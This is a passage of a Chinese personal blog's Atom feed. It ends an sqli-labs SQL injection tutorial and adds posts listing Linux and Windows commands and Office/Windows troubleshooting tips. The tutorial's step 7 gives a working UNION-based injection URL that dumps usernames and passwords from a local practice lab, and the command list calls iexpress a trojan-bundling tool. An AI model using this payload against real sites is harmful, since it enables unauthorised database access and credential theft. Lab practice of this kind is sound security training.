src="https://upload-images.jianshu.io/upload_images/9464729-227a32724c3f9f41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>发现有三个字段，<br><strong>7、</strong> <strong>获取字段中的数据</strong><br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39;</a> union select 1,(select concat_ws(char(32,58),id,username,password) from users limit 1,1),2–+<br>一次获取一个账户信息，通过limit 0,1 第一个参数控制第n-1个id，第二个参数控制显示行数<br><img src="https://upload-images.jianshu.io/upload_images/9464729-14e3634858446573.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9464729-ed24c05def6efc02.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png">     </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1、 sqli-labs需要lamp或wamp环境，本机使用wamp环境，使用phpstudy的集成环境&lt;br&gt;2、 Sqli-labs的安装，下载sqli-labs，解压到本地www目录下，打开WWW\sqli-labs\sql-connections文件下的db-cre
      
    
    </summary>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Security/"/>
    
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>Linux&amp;Windows之命令行使用</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/26/Linux-Windows%E4%B9%8B%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%BF%E7%94%A8/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/26/Linux-Windows之命令行使用/</id>
    <published>2018-04-26T03:51:39.000Z</published>
    <updated>2018-08-23T04:06:53.285Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Linux系统下基本命令：-（区分大小写-）"><a href="#Linux系统下基本命令：-（区分大小写-）" class="headerlink" title="Linux系统下基本命令： （区分大小写 ）"></a>Linux系统下基本命令： （区分大小写 ）</h3><p>uname 显示版本信息（同win2K的 ver ）<br>dir 显示当前目录文件,ls -al      显示包括隐藏文件（同win2K的 dir）<br>pwd 查询当前所在的目录位置<br>cd cd　..回到上一层目录，注意cd      与..之间有空格。cd　/返回到根目录。<br>cat 文件名 查看文件内容<br>cat &gt;abc.txt 往abc.txt文件中写上内容。<br>more 文件名 以一页一页的方式显示一个文本文件。<br>cp 复制文件<br>mv 移动文件<br>rm 文件名 删除文件，rm -a 目录名删除目录及子目录<br>mkdir 目录名 建立目录<br>rmdir 删除子目录，目录内没有文档。<br>chmod 设定档案或目录的存取权限<br>grep 在档案中查找字符串<br>diff 档案文件比较<br>find 档案搜寻<br>date 现在的日期、时间<br>who 查询目前和你使用同一台机器的人以及Login时间地点<br>w 查询目前上机者的详细资料<br>whoami 查看自己的帐号名称<br>groups 查看某人的Group<br>passwd 更改密码<br>history 查看自己下过的命令<br>ps 显示进程状态<br>kill 停止某进程<br>gcc 黑客通常用它来编译C语言写的文件<br>su 权限转换为指定使用者<br>telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。<br>ftp ftp连接上某服务器（同win2K）     </p><h3 id="windows-系统命令大全"><a href="#windows-系统命令大全" class="headerlink" title="windows 系统命令大全"></a>windows 系统命令大全</h3><h4 id="常用的CMD命令："><a href="#常用的CMD命令：" class="headerlink" title="常用的CMD命令："></a>常用的CMD命令：</h4><p>cd 改变当前目录<br>cls 清屏<br>copy 拷贝文件<br>del 删除文件<br>deltree 删除目录树<br>dir 列文件名<br>diskcopy 复制磁盘<br>edit 文本编辑<br>format 格式化磁盘<br>md 建立子目录<br>more 分屏显示<br>move 移动文件、改目录名<br>rd 删除目录<br>ren 改变文件名<br>echo 内容 &gt; 文件名 创建新文件<br>type 显示文件内容<br>xcopy 拷贝目录与文件<br>attrib 设置文件属性<br>chkdsk 检查磁盘<br>date 显示及修改日期<br>defrag 磁盘碎片整理<br>doskey 重新调用DOS命令<br>emm386 扩展内存管理<br>fdisk 硬盘分区<br>help 帮助<br>label 设置卷标号<br>path 设置搜寻目录<br>prempt 设置提示符<br>restore 恢复备份文件<br>time 显示及修改时间<br>scandisk检测、修理磁盘<br>set 设置环境变量<br>smartdrv设置磁盘加速器<br>undelete恢复被删的文件<br>append 设置非执行文件路径<br>debug 随机调试程序<br>diskcomp磁盘比较<br>expand 还原DOS文件<br>fasthelp快速显示帮助信息<br>fc 文件比较<br>interink启动服务器<br>intersvr启动客户机<br>qbasic Basic集成环境<br>setver 设置版本<br>share 文件共享<br>subst 路径替换<br>tree 列目录树<br>unformat恢复已格式化的磁盘<br>vsafe 防病毒<br>ver 显示DOS版本号<br>vol 显示磁盘卷标号<br>ctty 改变控制设备<br>nbtstat 该命令使用TCP/IP上的NetBIOS显示协议统计和当前TCP/IP连接，使用这个命令你可以得到远程主机的NETBIOS信息</p><h4 id="计算机运行命令全集"><a href="#计算机运行命令全集" class="headerlink" title="计算机运行命令全集"></a>计算机运行命令全集</h4><p>winver———检查Windows版本<br>wmimgmt.msc—-打开windows管理体系结构<br>wupdmgr——–windows更新程序<br>winver———检查Windows版本<br>wmimgmt.msc—-打开windows管理体系结构<br>wupdmgr——–windows更新程序<br>wwww——–windows脚本宿主设置<br>write———-写字板winmsd—–系统信息<br>wiaacmgr——-扫描仪和照相机向导<br>winchat——–XP自带局域网聊天<br>mem.exe——–显示内存使用情况<br>Msconfig.exe—系统配置实用程序<br>mplayer2——-简易widnows media player<br>mspaint——–画图板<br>mstsc———-远程桌面连接<br>mplayer2——-媒体播放机<br>magnify——–放大镜实用程序<br>mmc————打开控制台<br>mobsync——–同步命令<br>dxdiag———检查directx信息<br>drwtsn32—— 系统医生<br>devmgmt.msc— 设备管理器<br>dfrg.msc——-磁盘碎片整理程序<br>diskmgmt.msc—磁盘管理实用程序<br>dcomcnfg——-打开系统组件服务<br>ddeshare——-打开DDE共享设置<br>dvdplay——–DVD播放器<br>net stop messenger—–停止信使服务<br>net start messenger—-开始信使服务<br>notepad——–打开记事本<br>nslookup——-网络管理的工具向导<br>ntbackup——-系统备份和还原<br>narrator——-屏幕”讲述人”<br>ntmsmgr.msc—-移动存储管理器<br>ntmsoprq.msc—移动存储管理员操作请求<br>netstat -an—-(TC)命令检查接口<br>syncapp——–创建一个公文包<br>sysedit——–系统配置编辑器<br>sigverif——-文件签名验证程序<br>sndrec32——-录音机<br>shrpubw——–创建共享文件夹<br>secpol.msc—–本地安全策略<br>syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码<br>services.msc—本地服务设置<br>Sndvol32——-音量控制程序<br>sfc.exe——–系统文件检查器<br>sfc /scannow—windows文件保护<br>tsshutdn——-60秒倒计时关机命令<br>tourstart——xp简介（安装完成后出现的漫游xp程序）<br>taskmgr——–任务管理器<br>eventvwr——-事件查看器<br>eudcedit——-造字程序<br>explorer——-打开资源管理器<br>packager——-对象包装程序<br>perfmon.msc—-计算机性能监测程序<br>progman——–程序管理器<br>regedit.exe—-注册表<br>rsop.msc——-组策略结果集<br>regedt32——-注册表编辑器<br>rononce -p —-15秒关机<br>regsvr32 /u *.dll—-停止dll文件运行<br>regsvr32 /u zipfldr.dll——取消ZIP支持<br>cmd.exe——–CMD命令提示符<br>chkdsk.exe—–Chkdsk磁盘检查<br>certmgr.msc—-证书管理实用程序<br>calc———–启动计算器<br>charmap——–启动字符映射表<br>cliconfg——-SQL SERVER 客户端网络实用程序<br>Clipbrd——–剪贴板查看器<br>conf———–启动netmeeting<br>compmgmt.msc—计算机管理<br>cleanmgr——-**整理<br>ciadv.msc——索引服务程序<br>osk————打开屏幕键盘<br>odbcad32——-ODBC数据源管理器<br>oobe/msoobe /a—-检查XP是否激活<br>lusrmgr.msc—-本机用户和组<br>logoff———注销命令<br>iexpress——-木马捆绑工具，系统自带<br>Nslookup——-IP地址侦测器<br>fsmgmt.msc—–共享文件夹管理器<br>utilman——–辅助工具管理器<br>gpedit.msc—–组策略     </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Linux系统下基本命令：-（区分大小写-）&quot;&gt;&lt;a href=&quot;#Linux系统下基本命令：-（区分大小写-）&quot; class=&quot;headerlink&quot; title=&quot;Linux系统下基本命令： （区分大小写 ）&quot;&gt;&lt;/a&gt;Linux系统下基本命令： （区分大小写
      
    
    </summary>
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Windows使用问题</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/22/office/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/22/office/</id>
    <published>2018-04-22T07:20:40.000Z</published>
    <updated>2018-04-24T00:50:35.272Z</updated>
    
    <content type="html"><![CDATA[<h2 id="office的问题"><a href="#office的问题" class="headerlink" title="office的问题"></a>office的问题</h2><h3 id="Office打开文件问题"><a href="#Office打开文件问题" class="headerlink" title="Office打开文件问题"></a>Office打开文件问题</h3><p><img src="https://upload-images.jianshu.io/upload_images/9464729-c534cdd14f4c6fc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="问题"><br>解决此问题，先左击该文件，再右击属性，右下角文件属性，解除锁定<br><img src="https://upload-images.jianshu.io/upload_images/9464729-5747ad9c09d37b12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="属性"></p><p>问题解决</p><h3 id="两行文字之间有空白段"><a href="#两行文字之间有空白段" class="headerlink" title="两行文字之间有空白段"></a>两行文字之间有空白段</h3><p>PDF转为word的文件，两行文字之间有空白段，但是按删除键却删除不了，这是由于文档中插入了分页符，我们需要删除分页符</p><p><img src="https://upload-images.jianshu.io/upload_images/9464729-3968c9f2aaa32056.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>删除分页符方法：第三步处，鼠标移至分页符前面按下Delete键即可删除此段空白<br><img src="https://upload-images.jianshu.io/upload_images/9464729-c7a499532db8cf71.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h2 id="windows管理员权限删除文件依然删除不掉"><a href="#windows管理员权限删除文件依然删除不掉" class="headerlink" title="windows管理员权限删除文件依然删除不掉"></a>windows管理员权限删除文件依然删除不掉</h2><p>电脑在开机状态下按shift键，选择重启，开机进入高级选项模式，进入命令行模式，使用命令删除此类文件<br>rd /s /q 文件夹<br>del /F /S /Q 文件夹</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;office的问题&quot;&gt;&lt;a href=&quot;#office的问题&quot; class=&quot;headerlink&quot; title=&quot;office的问题&quot;&gt;&lt;/a&gt;office的问题&lt;/h2&gt;&lt;h3 id=&quot;Office打开文件问题&quot;&gt;&lt;a href=&quot;#Office打开文件问题&quot;
      
    
    </summary>
    
      <category term="Windows" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Windows/"/>
    
    
      <category term="Windows" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Windows/"/>
    
  </entry>
  
</feed>
